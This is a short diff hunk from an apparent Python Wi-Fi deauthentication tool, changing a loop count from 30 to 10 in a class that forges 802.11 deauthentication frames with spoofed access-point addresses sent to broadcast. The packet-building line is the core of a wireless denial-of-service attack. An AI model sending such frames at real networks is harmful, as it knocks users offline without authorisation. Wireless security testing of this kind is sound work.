@@ -33,7 +33,7 @@ class Deauth(object):
         if len(self.APs) >= 7:
             self.burst = 3
         i=0
-        while i<30:
+        while i<10:
             for bssid in self.APs:
                 packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                 channel = self.APs[bssid]
